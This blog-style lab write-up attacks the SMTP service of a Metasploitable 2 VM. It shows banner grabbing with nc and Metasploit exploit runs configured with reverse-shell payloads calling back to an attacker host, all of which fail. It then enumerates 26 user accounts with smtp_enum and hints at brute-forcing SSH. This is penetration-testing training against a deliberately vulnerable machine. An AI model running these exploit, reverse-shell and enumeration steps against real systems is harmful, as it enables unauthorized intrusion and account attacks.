<!--hacking, metasploit, smtp-->
# Mailploitation

For this post I will target the SMTP server running on the Metasploitable 2 VM I have set up as my target. By now my approach
should be clear:

1. Identify target
2. Find vulnerability
3. Craft exploit
4. ???
5. Profit!

Let's see if I can apply the same tactic again!

## The target and vulnerability

This time I am going to target the SMTP server running on the target (IP 192.168.56.103) :

    25/tcp    open  smtp        Postfix smtpd
    
Now I want to find a vulnerability for this service. I don't have version number so first I am going to attempt to 
find out some more information about the service. A regular banner grabbing with `nc` can reveal a lot of information. There is 
a metasploit module for SMTP banner grabbing as well `auxiliary/scanner/smtp/smtp_version` but `msfconsole` is slow to load
so I rather do it with `nc`:
    
    # nc 192.168.56.103 25
    220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
    
That doesn't really tell me anything I didn't already know. As a side note, this technique (or similar) also works for other protocols
for example FTP, SSH and HTTP. So the next step is to fire up `msfconsole` and do a search:

    msf > search smtp postfix

    Matching Modules
    ================

     Name                                        Disclosure Date  Description
     ----                                        ---------------  -----------
     auxiliary/client/smtp/emailer                                Generic Emailer (SMTP)
     auxiliary/dos/smtp/sendmail_prescan         2003-09-17       Sendmail SMTP Address prescan Memory Corruption
     auxiliary/fuzzers/smtp/smtp_fuzzer                           SMTP Simple Fuzzer
     auxiliary/scanner/smtp/smtp_enum                             SMTP User Enumeration Utility
     auxiliary/scanner/smtp/smtp_relay                            SMTP Open Relay Detection
     auxiliary/scanner/smtp/smtp_version                          SMTP Banner Grabber
     auxiliary/server/capture/smtp                                Authentication Capture: SMTP
     auxiliary/vsploit/pii/email_pii                              VSploit Email PII
     exploit/linux/misc/gld_postfix              2005-04-12       GLD (Greylisting Daemon) Postfix Buffer Overflow
     exploit/linux/smtp/exim4_dovecot_exec       2013-05-03       Exim and Dovecot Insecure Configuration Command Injection
     exploit/unix/smtp/clamav_milter_blackhole   2007-08-24       ClamAV Milter Blackhole-Mode Remote Code Execution
     exploit/unix/smtp/exim4_string_format       2010-12-07       Exim4 string_format Function Heap Buffer Overflow
     exploit/unix/webapp/squirrelmail_pgp_plugin 2007-07-09       SquirrelMail PGP Plugin Command Execution (SMTP)

In this output I have removed everything that is windows related and instead of removing the disclosure date I removed the ranking. Since
the disclosure date will play a role later on.

For let's focus on the exploits for now. How can I figure out if an exploit is applicable to the running server without trying everything?
Well the is where the disclosure date comes in handy. But first, one interesting question is if we can apply a UNIX exploit to a Linux 
system. The answer is: it depends. You might be able to use a UNIX exploit or cmd on a Linux target, the only way to find out is to
try or read the source for the exploit. Now back to the dates, from a previous `nmap` scan we know that a bit about the OS:

    Running: Linux 2.6.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6
    OS details: Linux 2.6.9 - 2.6.33
    
Linux 2.6.33 was released 24 February 2010, so by this date we can begin our search. 
A single exploit was released that year so let's try that:

    msf  > use exploit/unix/smtp/exim4_string_format
    msf exploit(exim4_string_format) > set RHOST 192.168.56.103 
    RHOST => 192.168.56.103
    msf exploit(exim4_string_format) > set payload cmd/unix/reverse_ruby
    payload => cmd/unix/reverse_ruby
    msf exploit(exim4_string_format) > set LHOST 192.168.56.102 
    LHOST => 192.168.56.102
    msf exploit(exim4_string_format) > exploit

    [*] Started reverse handler on 192.168.56.102:4444 
    [*] Connecting to 192.168.56.103:25 ...
    [*] Server: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
    [-] Exploit failed [no-target]: The target server is not running Exim!
    
So the target is not running Exim. This means that I can remove two exploits from the list, I can also remove the web app exploit 
(unrelated to Exim) so the remaining exploits are:
    
* `exploit/linux/misc/gld_postfix`
* `exploit/unix/smtp/clamav_milter_blackhole`

Let's try both:

    msf > use exploit/linux/misc/gld_postfix
    msf exploit(gld_postfix) > set RHOST 192.168.56.103
    RHOST => 192.168.56.103
    msf exploit(gld_postfix) > set RPORT 25
    RPORT => 25
    msf exploit(gld_postfix) > set payload linux/x86/shell/reverse_tcp 
    payload => linux/x86/shell/reverse_tcp     
    msf exploit(gld_postfix) > set LHOST 192.168.56.102 
    LHOST => 192.168.56.102
    msf exploit(gld_postfix) > exploit
    
    [*] Started reverse handler on 192.168.56.102:4444 

And nothing else happens, this is usually a sign that the exploit doesn't work. Specifically when no payload produces a different result.
So I move to the last exploit:

    msf > use exploit/unix/smtp/clamav_milter_blackhole
    msf exploit(clamav_milter_blackhole) > set RHOST 192.168.56.103 
    RHOST => 192.168.56.103
    msf exploit(clamav_milter_blackhole) > set payload cmd/unix/reverse_ruby
    payload => cmd/unix/reverse_ruby
    msf exploit(clamav_milter_blackhole) > set LHOST 192.168.56.102 
    LHOST => 192.168.56.102
    msf exploit(clamav_milter_blackhole) > exploit

    [*] Started reverse handler on 192.168.56.102:4444 

The same result, also the same for each payload. So I can conclude that the service is not vulnerable to any of the exploits in metasploit.

## What else?

This attack seems to have failed so let's see what else I can do. Referring back to the list of available metasploit modules I see a module
for user enumeration. It's always good to get users so let's do that.

    msf > use auxiliary/scanner/smtp/smtp_enum 
    msf auxiliary(smtp_enum) > show options 

    Module options (auxiliary/scanner/smtp/smtp_enum):

       Name       Current Setting      Required  Description
       ----       ---------------      --------  -----------
       RHOSTS                          yes       The target address range or CIDR identifier
       RPORT      25                   yes       The target port
       THREADS    1                    yes       The number of concurrent threads
       UNIXONLY   true                 yes       Skip Microsoft bannered servers when testing unix users
       USER_FILE  *snip*               yes       The file that contains a list of probable users accounts.

The USER_FILE variable is set to: `/usr/share/metasploit-framework/data/wordlists/unix_users.txt`, I removed it from the above output 
since it looks horrible when it wraps on the blog. Now I set the required parameters and run it:

    msf auxiliary(smtp_enum) > set RHOSTS 192.168.56.103
    RHOSTS => 192.168.56.103
    msf auxiliary(smtp_enum) > run

    [*] 192.168.56.103:25 Banner: 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
    [+] 192.168.56.103:25 Users found: backup, bin, daemon,  distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, 
        man, news, nobody, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed

I get 26 hits, the wordlist I used has:

    # cat /usr/share/metasploit-framework/data/wordlists/unix_users.txt | wc -l
    110

110 lines, so I can assume it works. So now that I have a set of users I can something devious with that information. 
Maybe brute force SSH or something like that, *wink wink*.
